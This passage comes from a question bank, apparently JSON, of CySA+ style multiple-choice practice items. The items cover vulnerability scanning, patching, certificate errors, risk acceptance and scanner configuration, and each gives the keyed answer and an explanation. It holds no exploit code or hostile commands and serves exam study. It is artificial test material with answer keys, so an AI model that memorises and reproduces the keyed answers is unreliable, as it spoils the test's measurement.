network.","l":"c8-controls","l2":"c2-iam","k":"default account password policy"},{"id":"d2-162","set":"d2","ch":6,"d":2,"q":"Dave is running a vulnerability scan of a client’s network for the first time. The client has never run such a scan and expects to find many results. What security control is likely to remediate the largest portion of the vulnerabilities discovered in Dave’s scan?","o":["Input validation","Patching","Intrusion prevention systems","Encryption"],"a":1,"e":"Although all the solutions listed may remediate some of the vulnerabilities discovered by Dave’s scan, the vast majority of issues in an unmaintained network result from missing security updates. Applying patches will likely resolve quite a few vulnerabilities, if not the majority of them.","l":"c6-remediation","l2":"c8-controls","k":"patch management primary remediation"},{"id":"d2-163","set":"d2","ch":6,"d":2,"q":"Kai is planning to patch a production system to correct a vulnerability detected during a scan. What process should she follow to correct the vulnerability but minimize the risk of a system failure?","o":["Kai should deploy the patch immediately on the production system.","Kai should wait 60 days to deploy the patch to determine whether bugs are reported.","Kai should deploy the patch in a sandbox environment to test it prior to applying it in production.","Kai should contact the vendor to determine a safe timeframe for deploying the patch in production."],"a":2,"e":"Kai should deploy the patch in a sandbox environment and then thoroughly test it prior to releasing it in production. This reduces the risk that the patch will not work well in her environment. Simply asking the vendor or waiting 60 days may identify some issues, but it does not sufficiently reduce the risk because the patch will not have been tested in her company’s environment.","l":"c6-remediation","l2":"c8-controls","k":"sandbox patch deployment testing"},{"id":"d2-164","set":"d2","ch":7,"d":2,"q":"Given no other information, which one of the following vulnerabilities would you consider the greatest threat to information confidentiality?","o":["HTTP TRACE/TRACK methods enabled","SSL Server with SSL v3 enabled vulnerability","phpinfo information disclosure vulnerability","Web application SQL injection vulnerability"],"a":3,"e":"Although all these vulnerabilities do pose a confidentiality risk, the SQL injection vulnerability poses the greatest threat because it may allow an attacker to retrieve the contents of a backend database. The HTTP TRACK/TRACE methods and PHP information disclosure vulnerabilities may provide reconnaissance information but would not directly disclose sensitive information. SSL v3 is no longer considered secure but is much more difficult to exploit for information theft than a SQL injection issue.","l":"c7-web-ot","l2":"c7-validate","k":"SQL injection confidentiality impact"},{"id":"d2-165","set":"d2","ch":8,"d":2,"q":"Ling recently completed the security analysis of a web browser deployed on systems in her organization and discovered that it is susceptible to a zero-day integer overflow attack. Who is in the best position to remediate this vulnerability in a manner that allows continued use of the browser?","o":["Ling","The browser developer","The network administrator","The domain administrator"],"a":1,"e":"Ling or the domain administrator could remove the software from the system, but this would not allow continued use of the browser. The network administrator could theoretically block all external web browsing, but this is not a practical solution. The browser developer is the only one in a good situation to correct an overflow error because it is a flaw in the code of the web browser.","l":"c8-controls","l2":"c7-server-network","k":"third-party browser patch responsibility"},{"id":"d2-166","set":"d2","ch":7,"d":2,"q":"Jeff’s team is preparing to deploy a new database service, and he runs a vulnerability scan of the test environment. This scan results in the five vulnerability reports shown here. Jeff is primarily concerned with correcting issues that may lead to a confidentiality breach. Which vulnerability should Jeff remediate first?<figure><img alt=\"Screenshot details 2 lists of software vulnerabilities for NetApp and Linux systems with severity levels and status for 5 items.\" loading=\"lazy\" src=\"img/pt/c02un061.png\"/></figure>","o":["Rational ClearCase Portscan Denial of Service vulnerability","Non-Zero Padding Bytes Observed in Ethernet Packets","Oracle Database TNS Listener Poison Attack vulnerability","Hidden RPC Services"],"a":2,"e":"Jeff should begin by looking at the highest-severity vulnerabilities and then identify whether they are confidentiality risks. The highest-severity vulnerability on this report is the Rational ClearCase Portscan Denial of Service vulnerability. However, a denial-of-service vulnerability affects availability, rather than confidentiality. The next highest-severity report is the Oracle Database TNS Listener Poison Attack vulnerability. A poisoning vulnerability may cause hosts to connect to an illegitimate server and could result in the disclosure of sensitive information. Therefore, Jeff should address this issue first.","l":"c7-validate","l2":"c7-server-network","k":"database listener vulnerability prioritization"},{"id":"d2-167","set":"d2","ch":1,"d":2,"q":"Eric is a security consultant and is trying to sell his services to a new client. He would like to run a vulnerability scan of their network prior to their initial meeting to show the client the need for added security. What is the most significant problem with this approach?","o":["Eric does not know the client’s infrastructure design.","Eric does not have permission to perform the scan.","Eric does not know what operating systems and applications are in use.","Eric does not know the IP range of the client’s systems."],"a":1,"e":"Although all these concerns are valid, the most significant problem is that Eric does not have permission from the potential client to perform the scan and may wind up angering the client (at best) or violating the law (at worst).","l":"c1-endpoint-pentest","l2":"c6-requirements","k":"authorized vulnerability scanning permission"},{"id":"d2-168","set":"d2","ch":7,"d":2,"q":"Renee is assessing the exposure of her organization to the denial-of-service vulnerability in the scan report shown here. She is specifically interested in determining whether an external attacker would be able to exploit the denial-of-service vulnerability. Which one of the following sources of information would provide her with the best information to complete this assessment?<figure><img alt=\"Screenshot details MediaWiki vulnerability report with C V S S scores, multiple C V E I Ds, and threat descriptions for security risks.\" loading=\"lazy\" src=\"img/pt/c02un062.png\"/></figure>","o":["Server logs","Firewall rules","IDS configuration","DLP configuration"],"a":1,"e":"The firewall rules would provide Renee with information about whether the service is accessible from external networks. Server logs would contain information on actual access but would not definitively state whether the server is unreachable from external addresses. Intrusion detection systems may detect an attack in progress but are not capable of blocking traffic and would not be relevant to Renee’s analysis. Data loss prevention systems protect against confidentiality breaches and would not be helpful against an availability attack.","l":"c7-validate","l2":"c1-network","k":"firewall rule exposure evaluation"},{"id":"d2-169","set":"d2","ch":6,"d":2,"q":"Mary is trying to determine what systems in her organization should be subject to vulnerability scanning. She would like to base this decision on the criticality of the system to business operations. Where should Mary turn to best find this information?","o":["The CEO","System names","IP addresses","Asset inventory"],"a":3,"e":"Mary should consult the organization’s asset inventory. If properly constructed and maintained, this inventory should contain information about asset criticality. The CEO may know some of this information, but it is unlikely that they would have all the necessary information or the time to review it. System names and IP addresses may contain some hints to asset criticality but would not be as good a source as an asset inventory that clearly identifies criticality.","l":"c6-requirements","l2":"c5-portscan","k":"asset inventory scan scoping"},{"id":"d2-170","set":"d2","ch":6,"d":2,"q":"Paul ran a vulnerability scan of his vulnerability scanner and received the result shown here. What is the simplest fix to this issue?<figure><img alt=\"Screenshot details medium severity details for Tenable Nessus version 6 with 2 vulnerabilities for cross site scripting and injection.\" loading=\"lazy\" src=\"img/pt/c02un063.png\"/></figure>","o":["Upgrade Nessus.","Remove guest accounts.","Implement TLS encryption.","Renew the server certificate."],"a":0,"e":"The vulnerability description indicates that this is a vulnerability that exists in versions of Nessus earlier than 6.6. Upgrading to a more recent version of Nessus would correct the issue.","l":"c6-config","l2":"c7-server-network","k":"vulnerability scanner software updates"},{"id":"d2-171","set":"d2","ch":6,"d":2,"q":"Kamea is designing a vulnerability management system for her organization. Her highest priority is conserving network bandwidth. She does not have the ability to alter the configuration or applications installed on target systems. What solution would work best in Kamea’s environment to provide vulnerability reports?","o":["Agent-based scanning","Server-based scanning","Passive network monitoring","Port scanning"],"a":2,"e":"Passive network monitoring meets Kamea’s requirements to minimize network bandwidth consumption while not requiring the installation of an agent. Kamea cannot use agent-based scanning because it requires application installation. She should not use server-based scanning because it consumes bandwidth. Port scanning does not provide vulnerability reports.","l":"c6-requirements","l2":"c6-config","k":"passive network vulnerability monitoring"},{"id":"d2-172","set":"d2","ch":6,"d":2,"q":"Aki is conducting a vulnerability scan when he receives a report that the scan is slowing down the network for other users. He looks at the performance configuration settings shown here. Which setting would be most likely to correct the issue?<figure><img alt=\"Screenshot details the Advanced Settings menu with checkboxes and performance fields, including 5 seconds network timeout.\" loading=\"lazy\" src=\"img/pt/c02un064.png\"/></figure>","o":["Enable safe checks.","Stop scanning hosts that become unresponsive during the scan.","Scan IP addresses in random order.","Max simultaneous hosts per scan."],"a":3,"e":"Of the answers presented, the maximum number of simultaneous hosts per scan is most likely to have an impact on the total bandwidth consumed by the scan. Enabling safe checks and stopping the scanning of unresponsive hosts is likely to resolve issues where a single host is negatively affected by the scan. Randomizing IP addresses would only change the order of scanning systems.","l":"c6-config","l2":"","k":"simultaneous host scan tuning"},{"id":"d2-173","set":"d2","ch":8,"d":2,"q":"Laura received a vendor security bulletin that describes a zero-day vulnerability in her organization’s main database server. This server is on a private network but is used by publicly accessible web applications. The vulnerability allows the decryption of administrative connections to the server. What reasonable action can Laura take to address this issue as quickly as possible?","o":["Apply a vendor patch that resolves the issue.","Disable all administrative access to the database server.","Require VPN access for remote connections to the database server.","Verify that the web applications use strong encryption."],"a":2,"e":"The issue raised by this vulnerability is the possibility of eavesdropping on administrative connections to the database server. Requiring the use of a VPN would add strong encryption to this connection and negate the effect of the vulnerability. A patch is not an option because this is a zero-day vulnerability, meaning that a patch is not yet available. Disabling administrative access to the database server would be unnecessarily disruptive to the business. The web server’s encryption level is irrelevant to the issue as it would affect connections to the web server, not the database server.","l":"c8-controls","l2":"c2-netarch","k":"VPN zero-day mitigating control"},{"id":"d2-174","set":"d2","ch":7,"d":2,"q":"Emily discovered the vulnerability shown here on a server running in her organization. What is the most likely underlying cause for this vulnerability?<figure><img alt=\"Screenshot details Windows O L E vulnerability report with C V E 2016-0153, 4 C V S S scores, and an open ticket state.\" loading=\"lazy\" src=\"img/pt/c02un065.png\"/></figure>","o":["Failure to perform input validation","Failure to use strong passwords","Failure to encrypt communications","Failure to install antimalware software"],"a":0,"e":"In a remote code execution attack, the attacker manages to upload arbitrary code to a server and run it. These attacks are often due to the failure of an application or operating system component to perform input validation.","l":"c7-server-network","l2":"c8-sdlc","k":"remote code execution vulnerability"},{"id":"d2-175","set":"d2","ch":7,"d":2,"q":"Rex recently ran a vulnerability scan of his organization’s network and received the results shown here. He would like to remediate the server with the highest number of the most serious vulnerabilities first. Which one of the following servers should be on his highest priority list?<figure><img alt=\"Screenshot details a dashboard with a table of vulnerable hosts and a donut chart of operating systems for 31 total assets.\" loading=\"lazy\" src=\"img/pt/c02un066.png\"/></figure>","o":["10.0.102.58","10.0.16.58","10.0.46.116","10.0.69.232"],"a":0,"e":"The server with IP address 10.0.102.58 is the only server among the possible answers that has a Level 5 vulnerability. Level 5 vulnerabilities have the highest severity and should be prioritized. The server at 10.0.16.58 has the most overall vulnerabilities but does not have any Level 5 vulnerabilities. The servers at 10.0.46.116 and 10.0.69.232 have only Level 3 vulnerabilities, which are less severe than Level 5 vulnerabilities.","l":"c7-validate","l2":"c6-remediation","k":"high-severity vulnerability host identification"},{"id":"d2-176","set":"d2","ch":6,"d":2,"q":"Abella is configuring a vulnerability scanning tool. She recently learned about a privilege escalation vulnerability that requires the user already have local access to the system. She would like to ensure that her scanners are able to detect this vulnerability as well as future similar vulnerabilities. What action can she take that would best improve the scanner’s ability to detect this type of issue?","o":["Enable credentialed scanning.","Run a manual vulnerability feed update.","Increase scanning frequency.","Change the organization’s risk appetite."],"a":0,"e":"Enabling credentialed scanning would increase the likelihood of detecting vulnerabilities that require local access to a server. Credentialed scans can read deep configuration settings that might not be available with an non-credentialed scan of a properly secured system. Updating the vulnerability feed manually may add a signature for this particular vulnerability but would not help with future vulnerabilities. Instead, Abella should configure automatic feed updates. Increasing the scanning frequency may increase the speed of detection but would not impact the scanner’s ability to detect the vulnerability. The organization’s risk appetite affects what vulnerabilities they choose to accept but would not change the ability of the scanner to detect a vulnerability.","l":"c6-config","l2":"c7-server-network","k":"credentialed scanning for privilege escalation"},{"id":"d2-177","set":"d2","ch":8,"d":2,"q":"Kylie reviewed the vulnerability scan report for a web server and found that it has multiple SQL injection and cross-site scripting vulnerabilities. What would be the least difficult way for Kylie to address these issues?","o":["Install a web application firewall.","Recode the web application to include input validation.","Apply security patches to the server operating system.","Apply security patches to the web server service."],"a":0,"e":"Applying patches to the server will not correct SQL injection or cross-site scripting flaws, since these reside within the web applications themselves. Kylie could correct the root cause by recoding the web applications to use input validation, but this is the more difficult path. A web application firewall would provide immediate protection with lower effort.","l":"c8-controls","l2":"c7-web-ot","k":"web application firewall compensating control"},{"id":"d2-178","set":"d2","ch":7,"d":2,"q":"Karen ran a vulnerability scan of a web server used on her organization’s internal network. She received the report shown here. What circumstances would lead Karen to dismiss this vulnerability as a false positive?<figure><img alt=\"Screenshot details S S L certificate signature verification failure with C V S S base score 9.4 and active status detected 160 times.\" loading=\"lazy\" src=\"img/pt/c02un067.png\"/></figure>","o":["The server is running SSL v2.","The server is running SSL v3.","The server is for internal use only.","The server does not contain sensitive information."],"a":2,"e":"This error indicates that the vulnerability scanner was unable to verify the signature on the digital certificate used by the web server. If the organization is using a self-signed digital certificate for this internal application, this would be an expected result.","l":"c7-server-network","l2":"c2-crypto","k":"internal CA certificate validation"},{"id":"d2-179","set":"d2","ch":7,"d":2,"q":"Which one of the following vulnerabilities is the most difficult to confirm with an external vulnerability scan?","o":["Cross-site scripting","Cross-site request forgery","Blind SQL injection","Unpatched web server"],"a":2,"e":"Cross-site scripting and cross-site request forgery vulnerabilities are normally easy to detect with vulnerability scans because the scanner can obtain visual confirmation of a successful attack. Unpatched web servers are often identified by using publicly accessible banner information. Although scanners can often detect many types of SQL injection vulnerabilities, it is often difficult to confirm blind SQL injection vulnerabilities because they do not return results to the attacker but rely on the silent (blind) execution of code.","l":"c7-validate","l2":"c7-web-ot","k":"blind SQL injection validation difficulty"},{"id":"d2-180","set":"d2","ch":7,"d":2,"q":"Holly ran a scan of a server in her datacenter, and the most serious result was the vulnerability shown here. What action is most commonly taken to remediate this vulnerability?<figure><img alt=\"Screenshot details a phpinfo Information Disclosure Vulnerability report with a C V S S base score of 5, threat details, and impact data.\" loading=\"lazy\" src=\"img/pt/c02un068.png\"/></figure>","o":["Remove the file from the server.","Edit the file to limit information disclosure.","Password protect the file.","Limit file access to a specific IP range."],"a":0,"e":"The phpinfo file is a testing file often used by web developers during the initial configuration of a server. Although any of the solutions provided here may remediate this vulnerability, the most common course of action is to simply remove this file before the server is moved into production or made publicly accessible.","l":"c7-server-network","l2":"c8-controls","k":"phpinfo file information disclosure"},{"id":"d2-181","set":"d2","ch":8,"d":2,"q":"During a recent vulnerability scan, Mark discovered a flaw in an internal web application that allows cross-site scripting attacks. He spoke with the manager of the team responsible for that application and was informed that he discovered a known vulnerability and the manager worked with other leaders and determined that the risk is acceptable and does not require remediation. What should Mark do?","o":["Object to the manager’s approach and insist on remediation.","Mark the vulnerability as a false positive.","Schedule the vulnerability for remediation in 6 months.","Mark the vulnerability as an exception."],"a":3,"e":"The manager has thought about the risk and, in consultation with others, determined that it is acceptable. Therefore, Mark should not press the matter and demand remediation, either now or in 6 months. He should mark this vulnerability as an approved exception in the scanner to avoid future alerts. It would not be appropriate to mark this as a false positive because the vulnerability detection was accurate.","l":"c8-governance","l2":"c6-remediation","k":"documented vulnerability exception"},{"id":"d2-182","set":"d2","ch":6,"d":2,"q":"Jacquelyn recently read about a new vulnerability in Apache web servers that allows attackers to execute arbitrary code from a remote location. She verified that her servers have this vulnerability, but this morning’s OpenVAS vulnerability scan report shows that the servers are secure. She contacted the vendor and determined that they have released a signature for this vulnerability, and it is working properly at other clients. What action can Jacquelyn take that will most likely address the problem efficiently?","o":["Add the web servers to the scan.","Reboot the vulnerability scanner.","Update the vulnerability feed.","Wait until tomorrow’s scan."],"a":2,"e":"Jacquelyn should update the vulnerability feed to obtain the most recent signatures from the vendor. She does not need to add the web servers to the scan because they are already appearing in the scan report. Rebooting the scanner would not necessarily update the feed. If she waits until tomorrow, the scanner may be configured to automatically update the feed, but this is not guaranteed and is not as efficient as simply updating the feed now.","l":"c6-config","l2":"","k":"vulnerability feed update"},{"id":"d2-183","set":"d2","ch":6,"d":2,"q":"Sharon is designing a new vulnerability scanning system for her organization. She must scan a network that contains hundreds of unmanaged hosts. Which of the following techniques would be most effective at detecting system configuration issues in her environment?\n<p><a href=\"#Que184\">Questions 184</a>–<a href=\"#Que186\">186</a> refer to the following scenario:</p>\n<p>Arlene ran a vulnerability scan of a VPN server used by contractors and employees to gain access to her organization’s network. An external scan of the server found the vulnerability shown here.</p>\n<figure><img alt=\"Screenshot details a medium severity report for S S L Certificate Signed Using Weak Hashing Algorithm with a technical description.\" loading=\"lazy\" src=\"img/pt/c02un069.png\"/></figure>","o":["Agent-based scanning","Credentialed scanning","Server-based scanning","Passive network monitoring"],"a":2,"e":"It would be difficult for Sharon to use agent-based or credentialed scanning in an unmanaged environment because she would have to obtain account credentials for each scanned system. Of the remaining two technologies, server-based scanning is more effective at detecting configuration issues than passive network monitoring.","l":"c6-config","l2":"","k":"server-based vulnerability scanning architecture"},{"id":"d2-184","set":"d2","ch":2,"d":2,"q":"Which one of the following hash algorithms would not trigger this vulnerability?","o":["MD4","MD5","SHA-1","SHA-256"],"a":3,"e":"To be used in a secure manner, certificates must take advantage of a hash function that is not prone to collisions. The MD2, MD4, MD5, and SHA-1 algorithms all have demonstrated weaknesses and would trigger a vulnerability. The SHA-256 algorithm is still considered secure. It is the default standard for data integrity, digital signatures, and blockchain technologies like Bitcoin. No practical, nontrivial attacks currently exist to break it.","l":"c2-crypto","l2":"c7-server-network","k":"secure certificate hashing algorithms"},{"id":"d2-185","set":"d2","ch":7,"d":2,"q":"What is the most likely result of failing to correct this vulnerability?","o":["All users will be able to access the site.","All users will be able to access the site, but some may see an error message.","Some users will be unable to access the site.","All users will be unable to access the site."],"a":1,"e":"This vulnerability should not prevent users from accessing the site, but it will cause their browsers to display a warning that the site is not secure.","l":"c7-server-network","l2":"c2-crypto","k":"untrusted certificate user impact"},{"id":"d2-186","set":"d2","ch":7,"d":2,"q":"How can Arlene correct this vulnerability?","o":["Reconfigure the VPN server to only use secure hash functions.","Request a new certificate.","Change the domain name of the server.","Implement an intrusion prevention system."],"a":1,"e":"This error is a vulnerability in the certificate itself and may be corrected only by requesting a new certificate from the certificate authority (CA) that uses a secure hash algorithm in the certificate signature.","l":"c7-server-network","l2":"c2-crypto","k":"digital certificate replacement"},{"id":"d2-187","set":"d2","ch":5,"d":2,"q":"After reviewing the results of a vulnerability scan, Bruce discovered that many of the servers in his organization are susceptible to a brute-force SSH attack. He would like to determine what external hosts attempted SSH connections to his servers and is reviewing firewall logs. What TCP port would relevant traffic most likely use?","o":["22","636","1433","1521"],"a":0,"e":"Secure Shell (SSH) traffic flows over TCP port 22. Port 636 is used by the Lightweight Directory Access Protocol Secure (LDAPS). Port 1433 is used by Microsoft SQL Server. Port 1521 is used by Oracle databases.","l":"c5-portscan","l2":"","k":"SSH default port identification"},{"id":"d2-188","set":"d2","ch":7,"d":2,"q":"Joaquin runs a vulnerability scan of the network devices in his organization and sees the vulnerability report shown here for one of those devices. What action should he take?<figure><img alt=\"Screenshot details a software vulnerability for S S L certificate common name mismatch, active on port 443, detected 6 times over 2 years.\" loading=\"lazy\" src=\"img/pt/c02un070.png\"/></figure>","o":["No action is necessary because this is an informational report.","Upgrade the version of the certificate.","Replace the certificate.","Verify that the correct ciphers are being used."],"a":2,"e":"This error occurs when the server name on a certificate does not match the name of the server in question. It is possible that this certificate was created for another device or that the device name is slightly different than that on the certificate. Joaquin should resolve this error by replacing the certificate with one containing the correct server name.","l":"c7-server-network","l2":"c2-crypto","k":"certificate name mismatch remediation"},{"id":"d2-189","set":"d2","ch":6,"d":2,"q":"Lori is studying vulnerability scanning as she prepares for the CySA+ exam. Which of the following is <i>not</i> one of the principles she should observe when preparing for the exam to avoid causing issues for her organization?","o":["Run only nondangerous scans on production systems to avoid disrupting a production service.","Run scans in a quiet manner without alerting other IT staff to the scans or their results to minimize the impact of false information.","Limit the bandwidth consumed by scans to avoid overwhelming an active network link.","Run scans outside of periods of critical activity to avoid disrupting the business."],"a":1,"e":"Lori should absolutely not try to run scans without the knowledge of other IT staff. She should inform her team of her plans and obtain permission for any scans that she runs. She should limit scans of production systems to safe plug-ins while she is learning. She should also limit the bandwidth consumed by her scans and the time of her scans to avoid impacts on production environments.","l":"c6-requirements","l2":"c1-endpoint-pentest","k":"authorized vulnerability scan coordination"},{"id":"d2-190","set":"d2","ch":6,"d":2,"q":"Meredith is configuring a vulnerability scan and would like to configure the scanner to perform credentialed scans. Of the menu options shown here, which will allow her to directly configure this capability?<figure><img alt=\"Screenshot details 7 vulnerability management modules for scan schedules and host authentication with video links up to 10 minutes.\" loading=\"lazy\" src=\"img/pt/c02un071.png\"/></figure>","o":["Manage Discovery Scans","Configure Scan Settings","Configure Search Lists","Set Up Host Authentication"],"a":3,"e":"Credentialed scans are also known as authenticated scans and rely on having credentials to log on to target hosts and read their configuration settings. Meredith should choose this option.","l":"c6-config","l2":"","k":"authenticated vulnerability scan configuration"},{"id":"d2-191","set":"d2","ch":8,"d":2,"q":"Norman is working with his manager to implement a vulnerability management program for his company. His manager tells him that he should focus on remediating critical and high-severity risks and that the organization does not want to spend time worrying about risks rated medium or lower. What type of criteria is Norman’s manager using to make this decision?","o":["Risk appetite","False positive","False negative","Data classification"],"a":0,"e":"Norman’s manager is deciding to use the organization’s risk appetite (or risk tolerance) to make this decision. He is stating that the organization will tolerate medium-severity risks but will not accept critical- or high-severity risks. This is not a case of a false positive or false negative error, since they are not discussing a specific vulnerability. The decision is not based on data classification because the criticality or sensitivity of information processed on systems was not discussed.","l":"c8-analyzing","l2":"c6-requirements","k":"risk appetite vulnerability threshold"},{"id":"d2-192","set":"d2","ch":6,"d":2,"q":"Sara’s organization has a well-managed test environment. What is the most likely issue that Sara will face when attempting to evaluate the impact of a vulnerability remediation by first deploying it in the test environment?","o":["Test systems are not available for all production systems.","Production systems require a different type of patch than test systems.","Significant configuration differences exist between test and production systems.","Test systems are running different operating systems than production systems."],"a":0,"e":"In a well-managed test environment, the test systems should be configured in a near-identical manner to production systems. They should be running the same operating systems and require the same patches. However, in almost every organization, there are systems running in production that do not have mirror deployments in test environments because of cost, legacy system issues, and other reasons.","l":"c6-remediation","l2":"c8-sdlc","k":"test environment fidelity limitations"},{"id":"d2-193","set":"d2","ch":7,"d":2,"q":"How many vulnerabilities listed in the report shown here are significant enough to warrant immediate remediation in a typical operating environment?<figure><img alt=\"Screenshot details 22 software vulnerabilities with severity levels, ports, and status of active and reopened for NetApp and Linux systems.\" loading=\"lazy\" src=\"img/pt/c02un072.png\"/></figure>","o":["22","14","5","0"],"a":3,"e":"The vulnerability scan of this server has fairly clean results. All of the vulnerabilities listed are severity 3 or lower. In most organizations, immediate remediation is required only for severity 4 or 5 vulnerabilities.","l":"c7-validate","l2":"c6-remediation","k":"clean scan report evaluation"},{"id":"d2-194","set":"d2","ch":6,"d":2,"q":"Which one of the following types of data is subject to regulations in the United States that specify the minimum frequency of vulnerability scanning?","o":["Driver’s license numbers","Insurance records","Credit and debit card data","Medical records"],"a":2,"e":"Credit and debit card information is subject to the Payment Card Industry Data Security Standard (PCI DSS), which contains specific provisions that dictate the frequency of vulnerability scanning. Although the other data types mentioned in the question are regulated, none of those regulations contains specific provisions that identify a required vulnerability scanning frequency.","l":"c6-requirements","l2":"","k":"payment card data regulations"},{"id":"d2-195","set":"d2","ch":6,"d":2,"q":"Chang is responsible for managing his organization’s vulnerability scanning program. He is experiencing issues with scans aborting because the previous day’s scans are still running when the scanner attempts to start the current day’s scans. Which one of the following solutions is <i>least</i> likely to resolve Chang’s issue?","o":["Add a new scanner.","Reduce the scope of the scans.","Reduce the sensitivity of the scans.","Reduce the frequency of the scans."],"a":2,"e":"Chang could resolve this issue by adding additional scanners to balance the load, reducing the frequency of scans, or reducing the scope (number of systems) of the scan. Changing the sensitivity level would not likely have a significant impact on the scan time.","l":"c6-config","l2":"","k":"scan duration sensitivity adjustment"},{"id":"d2-196","set":"d2","ch":6,"d":2,"q":"Bhanu is scheduling vulnerability scans for her organization’s datacenter. Which one of the following is a best practice that Bhanu should follow when scheduling scans?","o":["Schedule scans so that they are spread evenly throughout the day.","Schedule scans so that they run during periods of low activity.","Schedule scans so that they all begin at the same time.","Schedule scans so that they run during periods of peak activity to simulate performance under load."],"a":1,"e":"If possible, Bhanu should schedule the scans during periods of low activity to reduce the impact they have on business operations. The other approaches all have a higher risk of causing a disruption.","l":"c6-requirements","l2":"c6-config","k":"off-peak vulnerability scan scheduling"},{"id":"d2-197","set":"d2","ch":7,"d":2,"q":"Alan recently reviewed a vulnerability report and determined that an insecure direct object reference vulnerability existed on the system. He implemented a remediation to correct the vulnerability. After doing so, he verifies that his actions correctly mitigated the vulnerability. What term best describes the initial vulnerability report?","o":["True positive","True negative","False positive","False negative"],"a":0,"e":"This report is best classified as a true positive report because the vulnerability did exist on the system, even though it was later remediated. A true negative report occurs when a vulnerability scanner correctly reports that a vulnerability does not exist. A false positive report occurs when a scanner incorrectly reports that a vulnerability exists, while a false negative report occurs when a scanner incorrectly reports that no vulnerability exists.","l":"c7-validate","l2":"","k":"true positive scan finding"},{"id":"d2-198","set":"d2","ch":8,"d":2,"q":"Gwen is reviewing a vulnerability report and discovers that an internal system contains a serious flaw. After reviewing the issue with her manager, they decide that the system is sufficiently isolated and they will take no further action. What risk management strategy are they adopting?","o":["Risk avoidance","Risk mitigation","Risk transference","Risk acceptance"],"a":3,"e":"Gwen and her manager are choosing to take no further action and, therefore, are choosing to accept the remaining risk.","l":"c8-managing","l2":"","k":"risk acceptance vulnerability decision"},{"id":"d2-199","set":"d2","ch":6,"d":2,"q":"A vulnerability analyst is asked to assess a segmented operational technology (OT) environment that includes legacy devices and cannot tolerate active probing. The organization needs to identify assets and exposure while minimizing the risk of operational disruption. Which scanning method is <i>most</i> appropriate?","o":["Active, noncredentialed scan","Active, credentialed scan","Agent-based scan","Passive discovery scan"],"a":3,"e":"A passive discovery scan fits this scenario best because it observes existing network traffic to identify assets, services, and some vulnerabilities without sending active probes that could disrupt fragile, legacy OT devices in a segmented environment. An active noncredentialed scan would indiscriminately probe hosts and services, increasing the risk of crashing or destabilizing sensitive equipment. An active credentialed scan is even more intrusive, logging in and enumerating systems in detail, which provides richer data but is highly likely to cause operational issues in OT networks that cannot tolerate aggressive scanning. An agent-based scan requires installing and running software on endpoints, which is often not feasible or supported on legacy OT devices and can itself introduce instability or violate strict change control in industrial environments.","l":"c6-requirements","l2":"c7-web-ot","k":"passive discovery for operational technology"},{"id":"d2-200","set":"d2","ch":7,"d":2,"q":"A SOC receives threat intelligence indicating a specific CVE is being actively exploited in the wild. The vulnerability has a moderate CVSS score, but the EPSS score is high. The affected system is an Internet-facing customer portal, and an official patch is available. What should the analyst do first?","o":["Deprioritize the issue because the CVSS score is not critical.","Prioritize remediation due to active exploitation, high likelihood, and asset exposure.","Implement compensating controls only and wait for the next maintenance cycle.","Mark the finding as a false positive because scoring methods conflict."],"a":1,"e":"Prioritizing remediation is the most appropriate action because the vulnerability is already being exploited in the wild, the EPSS score indicates a high probability of real-world attacks, the asset is Internet-facing, and a vendor patch is available, all of which justify urgent treatment regardless of a moderate CVSS score. Deprioritizing the issue based solely on CVSS ignores the critical context of active exploitation and exploit likelihood, which are strong risk escalators. Implementing only compensating controls and waiting for a later maintenance cycle leaves an exposed, high-risk, externally reachable system vulnerable longer than necessary, even when a patch already exists. Marking it as a false positive misunderstands the situation, because there is no indication the technical finding is incorrect; the “conflict” between CVSS and EPSS reflects different dimensions of risk, not an error in detection.","l":"c7-validate","l2":"c6-remediation","k":"active exploit remediation prioritization"},{"id":"d2-201","set":"d2","ch":6,"d":2,"q":"A vulnerability analyst must assess an AWS environment for common security misconfigurations and best-practice alignment. The analyst wants a tool specifically suited for cloud infrastructure assessment. Which tool is the best choice?","o":["Prowler","Burp Suite","Masscan","Nmap"],"a":0,"e":"Prowler is the best choice because it is purpose-built to assess AWS environments against common security benchmarks and best practices, including checks for identity and access management, logging, networking, and other cloud-specific controls. Burp Suite focuses on web application testing and is ideal for analyzing HTTP traffic and web vulnerabilities rather than cloud configuration. Masscan is a very fast port scanner designed to discover open ports on large address spaces, but it does not evaluate cloud-specific settings or compliance. Nmap provides detailed host and service discovery and some vulnerability detection, yet it is primarily network-oriented and lacks the native, policy-based AWS configuration and best practice assessment features that Prowler offers.","l":"c6-tools","l2":"c2-infra","k":"Prowler AWS security assessment"},{"id":"d2-202","set":"d2","ch":8,"d":2,"q":"Padma is evaluating the security of an application developed within her organization. She would like to assess the application’s security by supplying it with invalid inputs. What technique is Padma planning to use?","o":["Fault injection","Stress testing","Mutation testing","Fuzz testing"],"a":3,"e":"Fuzz testing involves sending invalid or random data to an application to test its ability to handle unexpected data. Fault injection directly inserts faults into error handling paths, particularly error handling mechanisms that are rarely used or might otherwise be missed during normal testing. Mutation testing is related to fuzzing and fault injection, but rather than changing the inputs to the program or introducing faults to it, mutation testing makes small modifications to the program itself. Stress testing is a performance test that ensures applications and the systems that support them can stand up to the full production load.","l":"c8-appsec","l2":"","k":"fuzz testing application inputs"},{"id":"d2-203","set":"d2","ch":6,"d":2,"q":"A company has 1,200 sales laptops that are rarely on the corporate network because users work remotely. The vulnerability team needs consistent visibility into missing patches and configuration issues, even when devices are off-VPN. Which scanning approach is best for this scenario?","o":["External, noncredentialed scanning","Internal, agent-based scanning","Internal, agentless discovery-only scanning","Passive device fingerprinting"],"a":1,"e":"Internal, agent-based scanning best fits this situation because lightweight agents installed on the laptops can continuously report vulnerability and configuration data back to the management platform whenever the devices have internet access, regardless of whether they are on the corporate network or VPN. External, noncredentialed scanning would only see what is exposed externally and would miss detailed patch and configuration information, especially when laptops are behind home routers or NAT devices. Internal, agentless discovery-only scanning depends on devices being reachable on the internal network, so it fails when laptops are off VPN and not directly accessible. Passive device fingerprinting focuses on observing network traffic to infer device characteristics, which does not provide reliable, comprehensive visibility into missing patches or detailed configuration issues on roaming endpoints.","l":"c6-config","l2":"","k":"agent-based remote laptop scanning"},{"id":"d2-204","set":"d2","ch":8,"d":2,"q":"The Open Worldwide Application Security Project (OWASP) maintains an application called Orizon. This application reviews Java classes and identifies potential security flaws. What type of tool is Orizon?","o":["Fuzzer","Static code analyzer","Web application assessor","Fault injector"],"a":1,"e":"As stated in the question, Orizon performs a review of Java classes, indicating that it is performing a source code review. Techniques that perform source code review are grouped into the category of static code analyzers. The other testing techniques listed in this question are all examples of dynamic code analysis, where the testing application actually executes the 